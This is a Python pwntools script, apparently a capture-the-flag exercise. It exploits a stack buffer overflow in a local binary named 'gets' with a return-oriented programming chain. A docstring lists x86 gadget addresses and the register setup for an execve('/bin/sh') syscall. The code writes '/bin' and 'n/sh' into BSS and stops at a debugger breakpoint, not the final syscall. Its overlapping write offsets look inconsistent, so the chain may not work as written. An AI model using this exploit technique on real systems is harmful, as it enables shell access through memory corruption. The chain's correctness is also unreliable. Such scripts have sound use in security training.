from pwn import *

"""
 0x806f608:       89 c8                   mov    %ecx,%eax
 0x806f60a:       c3                      ret

 0x8068df0:       89 d0                   mov    %edx,%eax
 0x8068df2:       c3                      ret

 0x806f051:       59                      pop    %ecx
 0x806f052:       5b                      pop    %ebx
 0x806f053:       c3                      ret

 0x806f02a:       5a                      pop    %edx
 0x806f02b:       c3                      ret

 0x80999ad:       89 02                   mov    %eax,(%edx)
 0x80999af:       c3                      ret

 0x8048760:       8b 1c 24                mov    (%esp),%ebx
 0x8048763:       c3                      ret

 0x80decce:       53                      push   %ebx
 0x80deccf:       0a 0e                   or     (%esi),%cl
 0x80decd1:       14 43                   adc    $0x43,%al
 0x80decd3:       c3                      ret

 0x8048760:       8b 1c 24                mov    (%esp),%ebx
 0x8048763:       c3                      ret

 0x8049303:       31 c0                   xor    %eax,%eax
 0x8049305:       c3                      ret

 0x80e0870:       40                      inc    %eax
 0x80e0871:       c3                      ret
                       ******
 --                     11times
                       ******

 0x805117c:       89 d8                   mov    %ebx,%eax
 0x805117e:       5b                      pop    %ebx
 0x805117f:       c3                      ret

 0x806f630:       cd 80                   int    $0x80
 0x806f632:       c3                      ret

EAX = 0x0b
EBX = &/bin/sh
ECX = &&/bin/sh
EDX = 0x00
"""

BSS = 0x080ebd00

bkpt = p32(0x806f632)

write_eax_to_edx = p32(0x80999ad)
copy_edx_eax= p32(0x8068df0)

xor_eax = p32(0x8049303)
inc_eax = p32(0x80e0870)
pop_edx = p32(0x806f02a)
int_80 = p32(0x806f630)


p = process('./gets')

s = 28*'X' \
    + xor_eax \
    + pop_edx + p32(BSS+4) \
    + write_eax_to_edx \
    + pop_edx + "n/sh" + copy_edx_eax \
    + pop_edx + p32(BSS+3) \
    + write_eax_to_edx \
    + pop_edx + "/bin" + copy_edx_eax \
    + pop_edx + p32(BSS) \
    + write_eax_to_edx \
    + bkpt

GDB = """
b *0x806f632
c
"""
gdb.attach(p, GDB)


p.sendline(s)
p.interactive()
